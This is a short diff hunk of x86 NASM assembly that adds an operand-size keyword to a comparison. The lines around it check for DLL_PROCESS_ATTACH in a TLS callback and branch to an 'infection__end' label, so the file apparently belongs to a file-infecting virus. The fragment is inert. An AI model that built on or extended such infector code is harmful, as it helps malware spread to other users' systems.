@@ -16,7 +16,7 @@ main:
    push ebx
 
 %ifdef TLS
-   cmp [ebp+0xC],1
+   cmp dword [ebp+0xC],1
    jnz infection__end           ; if the given Reason is DLL_PROCESS_ATTACH, do the needful
                                 ; otherwise, terminate the infection.
 %endif
